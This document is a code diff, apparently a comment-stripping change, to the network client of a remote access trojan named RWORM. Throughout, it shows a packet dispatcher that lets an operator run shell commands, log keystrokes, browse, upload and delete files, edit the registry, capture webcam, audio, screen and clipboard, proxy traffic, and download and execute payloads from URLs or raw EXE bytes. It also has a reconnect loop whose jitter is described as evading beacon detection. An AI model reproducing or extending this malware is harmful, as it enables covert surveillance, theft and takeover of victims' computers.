@@ -26,7 +26,7 @@ namespace RWORM.Client.Network
 
     {
 
-        // ── Transport ──────────────────────────────────────────────────────────
+        
 
         private TcpClient?         _client;
 
@@ -42,7 +42,7 @@ namespace RWORM.Client.Network
 
 
 
-        // ── Modules ────────────────────────────────────────────────────────────
+        
 
         private readonly object     _shellLock = new();
 
@@ -52,7 +52,7 @@ namespace RWORM.Client.Network
 
         private Keylogger?    _keylogger;
 
-        private bool          _keyloggerOnline;   // mode the running logger is in
+        private bool          _keyloggerOnline;   
 
         private RemoteDesktop?_remoteDesktop;
         private WebcamManager? _webcamManager;
@@ -66,7 +66,7 @@ namespace RWORM.Client.Network
 
 
 
-        // ── Entry point ────────────────────────────────────────────────────────
+        
 
         public async Task ConnectAsync(string host, int port)
 
@@ -76,7 +76,7 @@ namespace RWORM.Client.Network
 
 
 
-            // Start offline keylogger if configured
+            
 
             if (Config.KeyloggerEnabled && !Config.KeyloggerOnline)
 
@@ -90,17 +90,17 @@ namespace RWORM.Client.Network
 
 
 
-            // Supervisor loop: connect → run session → tear down → retry forever.
+            
 
-            // It only returns when Disconnect() cancels _cts, so the client keeps
+            
 
-            // coming back no matter how the connection ends — including a first
+            
 
-            // connect that times out (the old code treated that OperationCanceled
+            
 
-            // as fatal and never retried), a server that is down for hours, or a
+            
 
-            // half-open socket where only writes start failing.
+            
 
             while (!_cts.Token.IsCancellationRequested)
 
@@ -146,7 +146,7 @@ namespace RWORM.Client.Network
 
                     _recvBuffer.Clear();
 
-                    delay = Config.ReconnectDelay;   // healthy session → reset backoff
+                    delay = Config.ReconnectDelay;   
 
 
 
@@ -178,7 +178,7 @@ namespace RWORM.Client.Network
 
 
 
-                    // Online keylogger starts after connect
+                    
 
                     if (Config.KeyloggerEnabled && Config.KeyloggerOnline)
 
@@ -186,7 +186,7 @@ namespace RWORM.Client.Network
 
 
 
-                    // Task on connect (once per process, as before)
+                    
 
                     if (!taskDone && Config.TaskEnabled && !string.IsNullOrWhiteSpace(Config.TaskLoaderUrl))
 
@@ -200,9 +200,9 @@ namespace RWORM.Client.Network
 
 
 
-                    // Blocks until receive or heartbeat observes a dead link;
+                    
 
-                    // that return is what drives the retry below.
+                    
 
                     await RunSessionAsync(_cts.Token);
 
@@ -212,7 +212,7 @@ namespace RWORM.Client.Network
 
                 {
 
-                    break;   // Disconnect() called — shut down cleanly
+                    break;   
 
                 }
 
@@ -220,7 +220,7 @@ namespace RWORM.Client.Network
 
                 {
 
-                    // Connect failed / timed out / session faulted — retry below.
+                    
 
                 }
 
@@ -242,7 +242,7 @@ namespace RWORM.Client.Network
 
 
 
-                // Smart Jitter: apply +/- 25% random variation to avoid periodic beacon signatures
+                
 
                 int jitterMs = Random.Shared.Next((int)(delay * 0.75), (int)(delay * 1.25) + 1);
 
@@ -251,7 +251,7 @@ namespace RWORM.Client.Network
 
                 catch (OperationCanceledException) { break; }
 
-                delay = Math.Min(delay * 2, 60_000);   // capped exponential backoff
+                delay = Math.Min(delay * 2, 60_000);   
 
             }
 
@@ -259,17 +259,17 @@ namespace RWORM.Client.Network
 
 
 
-        /// <summary>
+        
 
-        /// Runs one connected session (receive + heartbeat loops) and returns as
+        
 
-        /// soon as either loop observes the connection dying, so the supervisor
+        
 
-        /// loop can tear the socket down and retry. Exactly one session — and
+        
 
-        /// therefore one heartbeat — exists at a time.
+        
 
-        /// </summary>
+        
 
         private async Task RunSessionAsync(CancellationToken owner)
 
@@ -291,7 +291,7 @@ namespace RWORM.Client.Network
 
 
 
-            // One side saw the socket die — stop the other and surface faults.
+            
 
             sessionCts.Cancel();
 
@@ -357,19 +357,19 @@ namespace RWORM.Client.Network
 
         {
 
-            // Already running in the requested mode → nothing to do.
+            
 
             if (_keylogger?.IsRunning == true && _keyloggerOnline == online) return;
 
 
 
-            // Mode mismatch (e.g. offline logger started at boot, operator now
+            
 
-            // asks for online streaming): restart in the requested mode. The old
+            
 
-            // code returned early whenever IsRunning was true, so switching to
+            
 
-            // online mode was silently ignored.
+            
 
             if (_keylogger != null)
 
@@ -423,7 +423,7 @@ namespace RWORM.Client.Network
 
 
 
-        // ── Send ──────────────────────────────────────────────────────────────
+        
 
         public async Task SendAsync(byte[] data)
 
@@ -437,15 +437,15 @@ namespace RWORM.Client.Network
 
             {
 
-                // A write failure means the socket is dead (server gone, link
+                
 
-                // dropped). Close it so the pending ReadAsync in ReceiveLoop
+                
 
-                // throws immediately instead of hanging on a half-open socket
+                
 
-                // forever — that unwoken read is exactly what stopped the old
+                
 
-                // client from ever reconnecting.
+                
 
                 _connected = false;
 
@@ -459,7 +459,7 @@ namespace RWORM.Client.Network
 
 
 
-        // ── Receive loop ──────────────────────────────────────────────────────
+        
 
         private async Task ReceiveLoop(CancellationToken token)
 
@@ -495,9 +495,9 @@ namespace RWORM.Client.Network
 
             {
 
-                // End the session (RunSessionAsync) and, through it, the whole
+                
 
-                // supervisor loop's current attempt — the loop then retries.
+                
 
                 _connected = false;
 
@@ -507,7 +507,7 @@ namespace RWORM.Client.Network
 
 
 
-        // ── Drain packets ──────────────────────────────────────────────────────
+        
 
         private void DrainPackets()
 
@@ -602,7 +602,7 @@ namespace RWORM.Client.Network
 
 
 
-        // ── Dispatch ──────────────────────────────────────────────────────────
+        
 
         private async Task DispatchPacket(byte type, int channel, byte[] payload)
 
@@ -616,7 +616,7 @@ namespace RWORM.Client.Network
 
             {
 
-                // ── Shell ──────────────────────────────────────────────────
+                
 
                 case 0x03: ExecuteShellCommand(txt());  break;
 
@@ -628,21 +628,21 @@ namespace RWORM.Client.Network
 
 
 
-                // ── File Manager ──────────────────────────────────────────
+                
 
-                case 0x30: // FM_LIST_REQ — payload = path
+                case 0x30: 
 
                     await SendAsync(CreatePacket(0x31, 0, FileOps.ListDirectory(txt())));
 
                     break;
 
-                case 0x32: // FM_DOWNLOAD_REQ — payload = path
+                case 0x32: 
 
                     await SendAsync(CreatePacket(0x33, 0, FileOps.ReadFile(txt())));
 
                     break;
 
-                case 0x34: // FM_UPLOAD — payload = path\x00[binary data]
+                case 0x34: 
 
                 {
 
@@ -666,13 +666,13 @@ namespace RWORM.Client.Network
 
                 }
 
-                case 0x35: // FM_DELETE
+                case 0x35: 
 
                     await SendAsync(CreatePacket(0x37, 0, FileOps.DeletePath(txt())));
 
                     break;
 
-                case 0x36: // FM_MKDIR
+                case 0x36: 
 
                     await SendAsync(CreatePacket(0x37, 0, FileOps.MakeDir(txt())));
 
@@ -680,15 +680,15 @@ namespace RWORM.Client.Network
 
 
 
-                // ── Keylogger ──────────────────────────────────────────────
+                
 
-                case 0x40: // KEYLOG_START — payload = "online" or "offline"
+                case 0x40: 
 
                     EnsureKeylogger(txt() == "online");
 
                     break;
 
-                case 0x41: // KEYLOG_STOP
+                case 0x41: 
 
                     if (_keylogger != null)
 
@@ -702,7 +702,7 @@ namespace RWORM.Client.Network
 
                     break;
 
-                case 0x43: // KEYLOG_DUMP — send offline log
+                case 0x43: 
 
                     await SendAsync(CreatePacket(0x42, 0, _keylogger?.GetOfflineLog() ?? ""));
 
@@ -710,15 +710,15 @@ namespace RWORM.Client.Network
 
 
 
-                // ── Process Manager ────────────────────────────────────────
+                
 
-                case 0x50: // PROC_LIST_REQ
+                case 0x50: 
 
                     await SendAsync(CreatePacket(0x51, 0, ProcManager.ListProcesses()));
 
                     break;
 
-                case 0x52: // PROC_KILL — payload = pid (ascii)
+                case 0x52: 
 
                     if (int.TryParse(txt(), out int pid))
 
@@ -728,15 +728,15 @@ namespace RWORM.Client.Network
 
 
 
-                // ── Registry ──────────────────────────────────────────────
+                
 
-                case 0x60: // REG_LIST_REQ
+                case 0x60: 
 
                     await SendAsync(CreatePacket(0x61, 0, RegEditor.ListKey(txt())));
 
                     break;
 
-                case 0x64: // REG_WRITE — payload = "fullPath\x00valueName\x00kind\x00data"
+                case 0x64: 
 
                 {
 
@@ -752,7 +752,7 @@ namespace RWORM.Client.Network
 
                 }
 
-                case 0x65: // REG_DELETE — payload = "fullPath\x00valueName"
+                case 0x65: 
 
                 {
 
@@ -770,11 +770,11 @@ namespace RWORM.Client.Network
 
 
 
-                // ── Loader ─────────────────────────────────────────────────
+                
 
-                // ── System Metrics ─────────────────────────────────────────
+                
 
-                case 0x55: // METRICS_REQ
+                case 0x55: 
 
                     await SendAsync(CreatePacket(0x56, 0, SysMetrics.GetMetricsJson()));
 
@@ -782,7 +782,7 @@ namespace RWORM.Client.Network
 
 
 
-                case 0x70: // LOADER_EXEC — payload = URL
+                case 0x70: 
 
                     await SendAsync(CreatePacket(0x71, 0,
 
@@ -792,10 +792,10 @@ namespace RWORM.Client.Network
 
 
 
-                                // ── Reverse Proxy 0x90-0x92 ─────────────────────────────────
-                case 0x90: // PROXY_START
-                case 0x91: // PROXY_DATA
-                case 0x92: // PROXY_STOP
+                                
+                case 0x90: 
+                case 0x91: 
+                case 0x92: 
                     if (_proxyManager == null)
                     {
                         _proxyManager = new ReverseProxyManager(async (op, chan, data) =>
@@ -807,9 +807,9 @@ namespace RWORM.Client.Network
                     _proxyManager.HandlePacket(type, channel, payload);
                     break;
 
-                // ── Remote Desktop ─────────────────────────────────────────
+                
 
-                case 0x80: // RD_START — payload = optional monitor index
+                case 0x80: 
                 {
                     int monIdx = 0;
                     if (payload.Length > 0 && int.TryParse(txt(), out int parsedIdx))
@@ -827,17 +827,17 @@ namespace RWORM.Client.Network
                     break;
                 }
 
-                case 0x82: // RD_INPUT — payload = "mouse\0..." or "key\0..."
+                case 0x82: 
                 {
                     RemoteDesktop.HandleInput(txt());
                     break;
                 }
 
-                // ── Service Manager ─────────────────────────────────────────
-                case 0xC0: // SERVICES_LIST_REQ
+                
+                case 0xC0: 
                     await SendAsync(CreatePacket(0xC1, 0, ServiceManager.ListServices()));
                     break;
-                case 0xC2: // SERVICE_CTRL_REQ — payload = "name\x00action"
+                case 0xC2: 
                 {
                     var parts = txt().Split('\x00');
                     if (parts.Length >= 2)
@@ -845,16 +845,16 @@ namespace RWORM.Client.Network
                     break;
                 }
 
-                // ── Net Monitor ─────────────────────────────────────────────
-                case 0xC4: // NET_LIST_REQ
+                
+                case 0xC4: 
                     await SendAsync(CreatePacket(0xC5, 0, NetMonitor.ListConnections()));
                     break;
 
-                // ── Autorun / Startup ───────────────────────────────────────
-                case 0xC6: // STARTUP_LIST_REQ
+                
+                case 0xC6: 
                     await SendAsync(CreatePacket(0xC7, 0, AutorunManager.ListStartupEntries()));
                     break;
-                case 0xC8: // STARTUP_DEL_REQ — payload = "scope\x00name\x00location"
+                case 0xC8: 
                 {
                     var parts = txt().Split('\x00');
                     if (parts.Length >= 3)
@@ -862,21 +862,21 @@ namespace RWORM.Client.Network
                     break;
                 }
 
-                // ── Clipboard ───────────────────────────────────────────────
-                case 0xCA: // CLIPBOARD_GET_REQ
+                
+                case 0xCA: 
                     await SendAsync(CreatePacket(0xCB, 0, ClipboardManager.GetClipboardText()));
                     break;
-                case 0xCC: // CLIPBOARD_SET_REQ — payload = newText
+                case 0xCC: 
                     await SendAsync(CreatePacket(0xCD, 0, ClipboardManager.SetClipboardText(txt())));
                     break;
 
-                case 0x84: // RD_MONITORS_REQ
+                case 0x84: 
 
                     await SendAsync(CreatePacket(0x85, 0, RemoteDesktop.GetMonitorsJson()));
 
                     break;
 
-                case 0x83: // RD_STOP
+                case 0x83: 
 
                     _remoteDesktop?.Stop();
 
@@ -886,11 +886,11 @@ namespace RWORM.Client.Network
 
 
 
-                // ── Webcam 0xE0-0xE3 ───────────────────────────────────────
-                case 0xE0: // WEBCAM_DEVICES_REQ
+                
+                case 0xE0: 
                     await SendAsync(CreatePacket(0xE1, 0, WebcamManager.GetDevicesJson()));
                     break;
-                case 0xE2: // WEBCAM_START — payload = index (ascii)
+                case 0xE2: 
                 {
                     int devIdx = 0;
                     if (payload.Length > 0 && int.TryParse(txt(), out int parsedDev))
@@ -900,33 +900,33 @@ namespace RWORM.Client.Network
                     _webcamManager.Start();
                     break;
                 }
-                case 0xE4: // WEBCAM_STOP
+                case 0xE4: 
                     _webcamManager?.Stop();
                     _webcamManager = null;
                     break;
 
-                // ── Audio 0xE5-0xE7 ─────────────────────────────────────────
-                case 0xE5: // AUDIO_START
+                
+                case 0xE5: 
                     _audioManager?.Stop();
                     _audioManager = new AudioManager(async chunk => await SendAsync(CreatePacket(0xE6, 0, chunk)));
                     _audioManager.Start();
                     break;
-                case 0xE7: // AUDIO_STOP
+                case 0xE7: 
                     _audioManager?.Stop();
                     _audioManager = null;
                     break;
 
-                // ── URL & System 0xD0-0xD8 ──────────────────────────────────
-                case 0xD0: // OPEN_URL — payload = url
+                
+                case 0xD0: 
                     await SendAsync(CreatePacket(0xD1, 0, UrlOpener.OpenUrl(txt())));
                     break;
-                case 0xD2: // INSTALLED_PROGS_REQ
+                case 0xD2: 
                     await SendAsync(CreatePacket(0xD3, 0, InstalledPrograms.GetInstalledPrograms()));
                     break;
-                case 0xD4: // SYSINFO_DETAILED_REQ
+                case 0xD4: 
                     await SendAsync(CreatePacket(0xD5, 0, SystemInfoDetailed.GetDetailedInfo()));
                     break;
-                case 0xD6: // PC_POWER — payload = action
+                case 0xD6: 
                 {
                     string action = txt().Trim().ToLowerInvariant();
                     switch (action)
@@ -942,16 +942,16 @@ namespace RWORM.Client.Network
                     break;
                 }
 
-                // ── MessageBox 0xD8 ─────────────────────────────────────────
-                case 0xD8: // MSGBOX_REQ — payload = json
+                
+                case 0xD8: 
                 {
                     byte[] resp = MessageBoxHandler.ShowMessageBox(txt());
                     await SendAsync(CreatePacket(0xD9, 0, resp));
                     break;
                 }
 
-                // ── Client Chat 0xEA-0xEC ────────────────────────────────────
-                case 0xEA: // CHAT_MSG_SEND (from C2/operator)
+                
+                case 0xEA: 
                 {
                     if (_chatManager == null)
                     {
@@ -963,14 +963,14 @@ namespace RWORM.Client.Network
                     _chatManager.HandleIncomingMessage(txt());
                     break;
                 }
-                case 0xEC: // CHAT_CLOSE
+                case 0xEC: 
                     _chatManager?.Close();
                     _chatManager = null;
                     break;
 
-                // ── Client control ─────────────────────────────────────────
+                
 
-                case 0xA0: // CLIENT_CLOSE
+                case 0xA0: 
 
                     Watchdog.PrepareCleanExit();
 
@@ -978,27 +978,27 @@ namespace RWORM.Client.Network
 
                     break;
 
-                case 0xA1: // CLIENT_UNINSTALL
+                case 0xA1: 
 
                     Watchdog.PrepareCleanExit();
 
-                    LoaderModule.Uninstall(); // exits
+                    LoaderModule.Uninstall(); 
 
                     break;
 
-                case 0xA2: // CLIENT_UPDATE — payload = URL
+                case 0xA2: 
 
                     await LoaderModule.Update(txt());
 
                     break;
 
-                case 0xA5: // WATCHDOG_STOP
+                case 0xA5: 
 
                     Watchdog.StopWatchdog();
 
                     break;
 
-                case 0xA6: // WATCHDOG_START
+                case 0xA6: 
 
                     Watchdog.StartWatchdog();
 
@@ -1006,9 +1006,9 @@ namespace RWORM.Client.Network
 
 
 
-                // ── Task: run raw file bytes ───────────────────────────────
+                
 
-                case 0xB0: // TASK_RUN_FILE_BYTES — payload = raw EXE bytes
+                case 0xB0: 
 
                 {
 
@@ -1062,7 +1062,7 @@ namespace RWORM.Client.Network
 
 
 
-        // ── Interactive shell ──────────────────────────────────────────────────
+        
 
         private void OpenInteractiveShell()
 
@@ -1122,7 +1122,7 @@ namespace RWORM.Client.Network
 
 
 
-        // ── One-shot shell ─────────────────────────────────────────────────────
+        
 
         private void ExecuteShellCommand(string command)
 
@@ -1160,7 +1160,7 @@ namespace RWORM.Client.Network
 
 
 
-        // ── System info ────────────────────────────────────────────────────────
+        
 
         private static async Task<(string ip, string countryCode)> FetchExternalIpInfoAsync()
 
@@ -1232,7 +1232,7 @@ namespace RWORM.Client.Network
 
 
 
-        // ── Heartbeat ──────────────────────────────────────────────────────────
+        
 
         private async Task HeartbeatLoop(CancellationToken token)
 
@@ -1242,11 +1242,11 @@ namespace RWORM.Client.Network
 
             {
 
-                // Token-aware delay so the session ends promptly on teardown;
+                
 
-                // the old tokenless delay kept a stray heartbeat alive across
+                
 
-                // reconnects and stacked a new one on every session.
+                
 
                 try { await Task.Delay(Config.HeartbeatInterval, token).ConfigureAwait(false); }
 
@@ -1260,7 +1260,7 @@ namespace RWORM.Client.Network
 
 
 
-        // ── Packet builder ─────────────────────────────────────────────────────
+        
 
         private byte[] CreatePacket(byte type, int sid, string text) => CreatePacket(type, sid, Encoding.UTF8.GetBytes(text));
 
